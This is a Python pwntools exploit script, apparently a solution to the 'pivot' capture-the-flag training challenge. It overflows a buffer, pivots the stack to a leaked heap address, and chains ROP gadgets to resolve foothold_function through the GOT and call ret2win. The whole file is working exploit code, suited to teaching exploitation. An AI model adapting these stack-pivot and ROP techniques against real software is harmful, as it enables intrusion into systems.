from pwn import *

context.arch = "amd64"
elf = ELF("pivot")
rop = ROP(elf)
p = elf.process()

offset = 40
plt_foothold = p64(elf.plt.foothold_function)
got_foothold = p64(elf.got.foothold_function)
ret2win_address = 0xa81
foothold_function = 0x96a
lib_offset = p64(ret2win_address - foothold_function)

pop_rax = p64(rop.rax.address)
xchg_rax_rsp = p64(0x4009bd)    # xchg rax, rsp; ret;

mov_rax = p64(0x4009c0)    # mov rax, qword ptr [rax]; ret;
pop_rbp = p64(rop.rbp.address)
add_rax_rbp = p64(0x4009c4)    # add rax, rbp; ret;
call_rax = p64(0x4006b0)    # call rax;

p.recvuntil(b"pivot: ")
heap_addr = p64(int(p.recvuntil(b"\n").strip().decode(), 16))

# Main payload landing on the heap
payload_1 = plt_foothold
payload_1 += pop_rax
payload_1 += got_foothold
payload_1 += mov_rax
payload_1 += pop_rbp
payload_1 += lib_offset
payload_1 += add_rax_rbp
payload_1 += call_rax

# Stack-pivoting to payload_1 on the heap
payload_2 = b'A' * offset
payload_2 += pop_rax
payload_2 += heap_addr
payload_2 += xchg_rax_rsp

p.recvuntil(b"> ")
p.sendline(payload_1)
p.recvuntil(b"> ")
p.sendline(payload_2)
print(p.recvall().decode())
